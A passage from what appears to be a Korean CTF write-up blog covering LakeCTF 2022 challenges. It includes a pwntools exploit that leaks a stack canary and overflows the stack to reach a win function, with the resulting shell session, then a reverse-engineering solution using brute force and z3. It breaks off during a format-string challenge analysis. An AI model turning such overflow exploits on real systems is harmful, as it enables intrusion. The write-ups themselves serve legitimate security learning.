Í∞ôÎã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./exe&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">6100</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = e.symbols[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;you wanna read: &#x27;</span>, <span class="built_in">str</span>(<span class="number">11</span>))</span><br><span class="line"></span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>)[:<span class="number">8</span>])</span><br><span class="line">log.info(<span class="string">&#x27;canary :: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;you wanna write: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">88</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(win)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;)&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] canary :: 0x53eaf0ab9b66a00</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">: Good</span><br><span class="line">Your command: $ </span><br><span class="line">$ id</span><br><span class="line">/bin/sh: 1: d: not found</span><br><span class="line">$ id</span><br><span class="line">uid=1000(jail) gid=1000(jail) groups=1000(jail)</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">run</span><br><span class="line">$ cat flag</span><br><span class="line">EPFL&#123;this_is_clearly_a_fake_flag&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - baby rev (rev, z3)</title>
      <link href="/221003-lakectf2022-baby_rev/"/>
      <url>/221003-lakectf2022-baby_rev/</url>
      
        <content type="html"><![CDATA[<p>Î∂ÑÏÑù ÌôòÍ≤Ω: Windows 11, Ubuntu 20.04<br>ÏÇ¨Ïö©Ïûê Ï†úÍ≥µ ÌååÏùº: Î∞îÏù¥ÎÑàÎ¶¨, nc Ï†ëÏÜç Ï£ºÏÜå</p><p>ÌèâÏÜåÏóê Î¶¨Î≤ÑÏã± Î∂ÑÏïºÎ•º Ïûò ÌíÄÏßÄ ÏïäÎäîÎç∞, Î≠îÍ∞Ä Ïò§ÎäòÎî∞Îùº ÌíÄÏñ¥Î≥¥Í≥† Ïã∂Ïñ¥ÏÑú ÏÜîÎ∏åÍ∞Ä ÎßéÏùÄ Î¶¨Î≤ÑÏã± ÌïòÎÇò Ïó¥Ïñ¥Î¥§Îã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>IDAÎ°ú Ïó¥Î©¥ mainÌï®ÏàòÍ∞Ä ÏûàÎäîÎç∞ ÎåÄÏ∂© ÌïµÏã¨Ï†ÅÏù∏ Î∂ÄÎ∂Ñ(Î∞ñÏóê ÏóÜÏßÄÎßå)ÏùÑ Í∞ÄÏ†∏Ïò§Î©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__printf_chk(<span class="number">1LL</span>, <span class="string">&quot;What&#x27;s your your number:&quot;</span>, envp);</span><br><span class="line">fflush(_bss_start);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;input);</span><br><span class="line">v3 = <span class="number">0LL</span>;</span><br><span class="line">key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( input - <span class="number">0x10000</span> &gt; <span class="number">0x7FFF0000</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_4;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v5 = input &gt;&gt; v3++;</span><br><span class="line">  key = (v5 &amp; <span class="number">1</span>) + <span class="number">2</span> * key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v3 != <span class="number">0x20</span> );</span><br><span class="line"><span class="keyword">if</span> ( input == key )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">// print flag</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏÇ¨Ïö©Ïûê ÏûÖÎ†•ÏùÑ Î∞õÍ≥† Í∑∏ ÏûÖÎ†•Ïóê ÎåÄÌï¥ ‚ÄòÏñ¥Îñ†Ìïú Ïó∞ÏÇ∞‚ÄôÏùÑ ÏßÑÌñâÌïú Í≤∞Í≥º(key)ÏôÄ ÎπÑÍµêÌï¥ÏÑú ÎßûÏúºÎ©¥ flagÎ•º Ï∂úÎ†•Ìï¥Ï§ÄÎã§.</p><p>Î∏åÎ£®Ìä∏ Ìè¨Ïã±ÏùÑ ÌïòÎ©¥ ÎêòÏßÄ ÏïäÏùÑÍπå? Ïù¥ ÏΩîÎìúÎ•º cÎ°ú ÏòÆÍ≤®ÏÑú Î∏åÌè¨Ìï¥Î¥êÏïºÍ≤†Îã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o solve solve.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> input = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (input - <span class="number">0x10000</span> &lt; <span class="number">0x7fff0001</span>) &#123;</span><br><span class="line"><span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> v3 = <span class="number">0</span>; v3 &lt; <span class="number">0x20</span>; v5++) &#123;</span><br><span class="line">key = ((input &gt;&gt; v3) &amp; <span class="number">1</span>) + <span class="number">2</span> * key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (input == key) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, input);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">input++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ïù¥Îü∞ÏãùÏúºÎ°ú cÎ°ú ÏΩîÎìúÎ•º ÏòÆÍ∏∞Í≥† Î£®ÌîÑÎ•º ÎèåÎ†§Ï£ºÎ©¥ ÏïÑÎûòÏôÄ Í∞ôÏù¥ <code>98304</code>ÎùºÎäî Í∞íÏù¥ ÎÇòÏò®Îã§. ÏÇ¨Ïã§ Ïù¥ Î¨∏Ï†ú Ï†ïÎãµÏùÑ Ïó¨Îü¨Í∞úÏù∏Îç∞ ÌïòÎÇòÎßå ÏûÖÎ†•ÌïòÎ©¥ flagÎ•º ÎçòÏ†∏Ï£ºÍ∏∞ ÎïåÎ¨∏Ïóê ÌïòÎÇòÎßå Ï∂úÎ†•ÌïòÍ≥† Î∞îÎ°ú breakÎ•º Ìï¥Ï£ºÏóàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/lake/rev-baby$ ./solve </span><br><span class="line">98304</span><br><span class="line">jir4vvit@ubuntu:~/ctf/lake/rev-baby$ nc chall.polygl0ts.ch 3600</span><br><span class="line">What&#x27;s your your number:98304</span><br><span class="line">EPFL&#123;4ft3r_th15_h0w_h4rD_caN_r3V_8e?&#125;</span><br></pre></td></tr></table></figure><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>Ïù¥ Î¨∏Ï†úÎ•º ÌååÏù¥Ïç¨ Î™®ÎìàÏù∏ <code>Z3 solver</code>Î•º Ïù¥Ïö©ÌïòÏó¨ ÌíÄ ÏàòÎèÑ ÏûàÎã§.</p><h3 id="Z3-solver"><a href="#Z3-solver" class="headerlink" title="Z3 solver"></a>Z3 solver</h3><p><code>Z3 solver</code>Îäî ÌäπÏ†ï Í∞í, Ï¶â Ï†ïÎãµÏùÑ Ï∞æÏïÑÏ£ºÎäî SMT solver Î™®ÎìàÏù¥ÎùºÍ≥† ÌïúÎã§. (SMT: Satisfiability Modulo Theories)<br>Ïñ¥Îñ†Ìïú ÏàòÏãùÏùÑ ÎßåÏ°±ÌïòÎäî Í∞íÏù¥ Ï°¥Ïû¨ÌïòÎäî ÏßÄ Ï∞æÏïÑÏ£ºÎäî Í±¥Îç∞, Ï°¥Ïû¨ÌïúÎã§Î©¥ Í∑∏ Í∞íÏùÑ Íµ¨Ìï¥Ï§ÄÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x + y = 12</span><br><span class="line">x - y = 6</span><br></pre></td></tr></table></figure><p>ÏòàÎ•º Îì§Ïñ¥, Ïù¥Îü∞ Ïó∞Î¶ΩÎ∞©Ï†ïÏãùÏù¥ Ï°¥Ïû¨Ìï† Îïå, xÏôÄ yÏùò Í∞íÏùÑ <code>Z3 solver</code>Í∞Ä Íµ¨Ìï¥Ï§Ñ Ïàò ÏûàÎã§.<br>Î∞îÎ°ú ÏïÑÎûòÏôÄ Í∞ôÏù¥..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from z3 import *</span><br><span class="line">&gt;&gt;&gt; x = Int(&#x27;x&#x27;)</span><br><span class="line">&gt;&gt;&gt; y = Int(&#x27;y&#x27;)</span><br><span class="line">&gt;&gt;&gt; solve(x+y==12,x-y==6)</span><br><span class="line">[x = 9, y = 3]</span><br></pre></td></tr></table></figure><p>ÏïÑÎûòÏóê Îã§Ïö¥Î°úÎìú Î∞©Î≤ïÍ≥º Ïó¨Îü¨ ÎßÅÌÅ¨Îì§ÏùÑ ÎÇ®Í∏∞Í≥† Z3Î•º Ïù¥Ïö©ÌïòÏó¨ Ïù¥ Î¨∏Ï†úÎ•º Ïñ¥ÎñªÍ≤å ÌíÄ Ïàò ÏûàÎäîÏßÄ ÏïåÏïÑÎ≥¥Ïûê.</p><h4 id="Îã§Ïö¥Î°úÎìú-Î∞©Î≤ï"><a href="#Îã§Ïö¥Î°úÎìú-Î∞©Î≤ï" class="headerlink" title="Îã§Ïö¥Î°úÎìú Î∞©Î≤ï"></a><strong>Îã§Ïö¥Î°úÎìú Î∞©Î≤ï</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><p><a href="https://github.com/Z3Prover/z3">Í≥µÏãù github ÎßÅÌÅ¨</a><br><a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">z3py-tutorial</a></p><h3 id="solve-with-Z3"><a href="#solve-with-Z3" class="headerlink" title="solve with Z3"></a>solve with Z3</h3><p>ÏùºÎã®. Î™®ÎìàÏùÑ Í∞ÄÏ†∏Ïò§Í≥† Î≥ÄÏàò Îëê Í∞úÎ•º ÏÑ†Ïñ∏Ìï¥Ïïº ÌïúÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#ipt = Int(&#x27;ipt&#x27;)</span></span><br><span class="line">ipt = BitVec(<span class="string">&quot;ipt&quot;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#key = Int(&#x27;key&#x27;) # key is not variable</span></span><br><span class="line">key = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>Ïã§ÏàòÎì§Ïù¥.. Ï£ºÏÑùÏ≤òÎ¶¨ÎêòÏñ¥ ÏûàÎäîÎç∞, Í∞ÄÏû• Ï≤òÏùå ÌñàÎçò Ïã§ÏàòÎäî ÏÇ¨Ïö©Ïûê Ïù∏ÌíãÏùÑ Í∑∏ÎÉ• <code>Int()</code>Î°ú Ï†ïÏùòÌïú Ï†êÏù¥Îã§.<br><code>BitVec(&quot;&quot;, ÎπÑÌä∏Ïàò)</code>Î°ú Ï†ïÏùòÌï¥Ïïº ÌïúÎã§. ÏôúÎÉêÌïòÎ©¥ Ïù¥ Î¨∏Ï†úÏóêÏÑú ÏÇ¨Ïö©Ïûê Ïù∏ÌíãÏùÑ Í∞ÄÏßÄÍ≥† ÎπÑÌä∏Ïó∞ÏÇ∞ÏùÑ ÏßÑÌñâÌïòÎäîÎç∞ <code>Int()</code>Î°ú ÏÑ†Ïñ∏ÌïòÎ©¥ TypeErrorÍ∞Ä Î∞úÏÉùÌïòÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError: unsupported operand type(s) for &gt;&gt;: &#x27;instance&#x27; and &#x27;int&#x27;</span><br></pre></td></tr></table></figure><p>Í∑∏ÎûòÏÑú ÎπÑÌä∏Ïó∞ÏÇ∞ÏùÑ Ìï† ÎïåÎäî ÎπÑÌä∏Ïó∞ÏÇ∞ÏùÑ ÏúÑÌïú <code>BitVec()</code>ÏúºÎ°ú ÏÑ†Ïñ∏ÏùÑ Ìï¥Ï§òÏïº ÌïúÎã§.</p><p>Îëê Î≤àÏß∏ ÌñàÎçò Ïã§ÏàòÎäî Îã®ÏàúÌïòÎã§. Í∑∏ÎÉ• ÎØ∏ÏßÄÏàò ÏïÑÎãåÎç∞ ÎØ∏ÏßÄÏàòÎ°ú ÏÑ†Ïñ∏Ìï¥Ï§¨Îã§. Í∑∏Îü¨Î©¥ ÏïàÎêúÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> v3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    key = ((ipt &gt;&gt; v3) &amp; <span class="number">1</span>) + <span class="number">2</span> * key</span><br></pre></td></tr></table></figure><p>ÌååÏù¥Ïç¨ÏúºÎ°ú Ïó∞ÏÇ∞ ÏΩîÎìúÎ•º ÏûëÏÑ±Ìï¥Ï§ÄÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(ipt - <span class="number">0x10000</span> &lt; <span class="number">0x7fff0001</span>)</span><br><span class="line">s.add(<span class="number">0</span> &lt; ipt)</span><br><span class="line">s.add(ipt == key)</span><br></pre></td></tr></table></figure><p><code>Z3 solver</code>Îäî <code>Solver</code> Í∞ùÏ≤¥Î•º ÏßÄÏõêÌï¥Ï§ÄÎã§. Ïù¥ Í∞ùÏ≤¥Î•º ÏÇ¨Ïö©Ìï¥Î≥¥Ïûê. <code>s.add(ÏàòÏãù)</code>Î°ú iptÏóê ÎåÄÌïú Ï†úÏïΩ Ï°∞Í±¥ Î∞è Í∞íÏùÑ Íµ¨ÌïòÎäî Ï°∞Í±¥ÎèÑ Ï∂îÍ∞ÄÌï¥Ï§¨Îã§.</p><p><a href="https://z3prover.github.io/api/html/classz3py_1_1_solver.html">Sovler Í∞ùÏ≤¥ Ï∞∏Í≥† ÎßÅÌÅ¨</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">    s.add(ipt != s.model()[ipt]) <span class="comment"># dupule check</span></span><br></pre></td></tr></table></figure><p><code>s.check()</code>Îäî Ìï¥Îãπ Î∞©Ï†ÅÏãùÏùÑ ÎßåÏ°±ÌïòÎäî Í∞í(Ï†ïÎãµ, Ìï¥)Ïù¥ ÏûàÎäîÏßÄ Ï≤¥ÌÅ¨Ìï¥Ï§ÄÎã§. Í∞íÏù¥ ÏûàÏúºÎ©¥ <code>sat</code>, ÏóÜÏúºÎ©¥ <code>unsat</code>, Ìï¥Í≤∞Ìï† Ïàò ÏóÜÏúºÎ©¥ <code>unknown</code>ÏùÑ Î∞òÌôòÌïúÎã§Í≥† ÌïúÎã§.</p><p>Ïù¥ Î¨∏Ï†úÎäî Í∞íÏù¥ Ïó¨Îü¨ Í∞úÍ∞Ä ÎÇòÏò§ÎØÄÎ°ú Ï§ëÎ≥µ Ï≤¥ÌÅ¨ÎèÑ Ìï¥Ï£ºÏóàÎã§. Î∞©Í∏à Íµ¨Ìïú iptÏùò Í∞íÏùÑ Ï†úÏô∏Ìïú Îã§Î•∏ Í∞íÏùÑ Íµ¨Ìï† Ïàò ÏûàÎã§.</p><p><code>s.model()</code>ÏùÄ <code>s.check()</code>Í∞Ä <code>sat</code>Ïùº Îïå ÎßåÏ°±ÌïòÎäî Ìï¥ Ï§ë ÌïòÎÇòÎ•º Î∞òÌôòÌïúÎã§.</p><h4 id="ÏµúÏ¢Ö-ÏΩîÎìú"><a href="#ÏµúÏ¢Ö-ÏΩîÎìú" class="headerlink" title="ÏµúÏ¢Ö ÏΩîÎìú"></a><strong>ÏµúÏ¢Ö ÏΩîÎìú</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ipt = BitVec(<span class="string">&quot;ipt&quot;</span>, <span class="number">32</span>)</span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    key = ((ipt &gt;&gt; v3) &amp; <span class="number">1</span>) + <span class="number">2</span> * key</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(ipt - <span class="number">0x10000</span> &lt; <span class="number">0x7fff0001</span>)</span><br><span class="line">s.add(<span class="number">0</span> &lt; ipt)</span><br><span class="line">s.add(ipt == key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">    s.add(ipt != s.model()[ipt]) <span class="comment"># duplicate check</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://tistory.d1n0.me/18">https://tistory.d1n0.me/18</a><br><a href="https://realsung.tistory.com/185">https://realsung.tistory.com/185</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> z3 </tag>
            
            <tag> rev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - Way to simple (32bit, fsb)</title>
      <link href="/221003-lakectf2022-way_too_simple/"/>
      <url>/221003-lakectf2022-way_too_simple/</url>
      
        <content type="html"><![CDATA[<p>Î∂ÑÏÑù ÌôòÍ≤Ω: Windows 11, Ubuntu 20.04<br>ÏÇ¨Ïö©Ïûê Ï†úÍ≥µ ÌååÏùº: Î∞îÏù¥ÎÑàÎ¶¨, ÎèÑÏª§ÌååÏùº</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Î≥¥Ìò∏-Í∏∞Î≤ï"><a href="#Î≥¥Ìò∏-Í∏∞Î≤ï" class="headerlink" title="Î≥¥Ìò∏ Í∏∞Î≤ï"></a>Î≥¥Ìò∏ Í∏∞Î≤ï</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?</span><br></pre></td></tr></table></figure><h3 id="ÌååÏùº-Ï†ïÎ≥¥"><a href="#ÌååÏùº-Ï†ïÎ≥¥" class="headerlink" title="ÌååÏùº Ï†ïÎ≥¥"></a>ÌååÏùº Ï†ïÎ≥¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exe: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=ad8d3e5e9cf076847f4c23ee0443e19aa7170e7c, stripped</span><br></pre></td></tr></table></figure><h3 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h3><p>Ïù¥ Î¨∏Ï†úÎäî Ï∑®ÏïΩÏ†êÏùÑ ÏÑ§Î™ÖÌïòÍ∏∞Ïóê ÏïûÏÑú Ìï† ÎßêÏù¥ Ï°∞Í∏à ÏûàÎã§.. „Öã„Öã</p><p>Î¨∏Ï†ú Ïã§ÌñâÏùÑ ÌïòÎ†§ÎäîÎç∞ ÏïÑÎûòÏôÄ Í∞ôÏù¥ Î¨∏Ï†ú Ïã§ÌñâÏù¥ ÏïàÎêòÏñ¥ÏÑú Ï°∞Í∏à ÎãπÌô©ÌñàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/lake/way_too_simple$ ./exe </span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>Íµ≥Ïù¥ Ïã§ÌñâÌïòÎ†§ÌïòÏßÄÎßêÍ≥† ÎèÑÏª§ÌååÏùº Ï£ºÏñ¥Ï°åÎäîÎç∞ buildÌïòÍ≥† run ÌïòÎ©¥ ÎêòÏßÄ ÏïäÏïÑ? ÎùºÍ≥† ÌïúÎã§Î©¥.. Ìï† ÎßêÏù¥ ÏóÜÍ∏¥ ÌïòÎã§. <code>docker build</code>Îäî ÏÑ±Í≥µÌñàÏúºÎÇò <code>docker run</code>Ïù¥ Ï†úÎåÄÎ°ú ÎêòÏßÄ ÏïäÏïòÎäîÎç∞, Ïù¥Ïú†Îäî Îî±Ìûà ÏïåÏïÑÎ≥¥ÏßÄ ÏïäÏïòÎã§. ÏôúÎÉêÎ©¥ Í∑∏ Í≥ºÏ†ïÏóêÏÑú IDAÎ°ú Î∞îÏù¥ÎÑàÎ¶¨ Ïó¥ÏóàÎçîÎãà Íµ≥Ïù¥ Î°úÏª¨ÏóêÏÑú Ïã§ÌñâÏãúÌÇ§ÏßÄ ÏïäÏïÑÎèÑ ÌíÄ Ïàò ÏûàÏùÑ Í≤É Í∞ôÏïòÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§. „Öé</p><h3 id="Ï∑®ÏïΩÏ†ê"><a href="#Ï∑®ÏïΩÏ†ê" class="headerlink" title="Ï∑®ÏïΩÏ†ê"></a>Ï∑®ÏïΩÏ†ê</h3><p>ÏùºÎã® Î¨∏Ï†úÏóêÏÑú Ï†úÍ≥µÎêú Î∞îÏù¥ÎÑàÎ¶¨Îäî 32bit Î∞îÏù¥ÎÑàÎ¶¨Ïù¥Îã§. IDAÎ°ú Ïó¥Ïñ¥Î≥¥Î©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">128</span>]; <span class="comment">// [esp+Ch] [ebp-8Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  sub_1111AE20(off_111B9498, <span class="number">0</span>);</span><br><span class="line">  sub_1111AE20(off_111B9494, <span class="number">0</span>);</span><br><span class="line">  sub_1111AE20(off_111B949C, <span class="number">0</span>);</span><br><span class="line">  flag_addr = (<span class="type">int</span>)read_flag();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The flag is at %p\n&quot;</span>, (<span class="type">const</span> <span class="type">void</span> *)flag_addr);</span><br><span class="line">  sub_11118F10(off_111B9498);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your magical spell! &quot;</span>);</span><br><span class="line">  sub_111187E0(<span 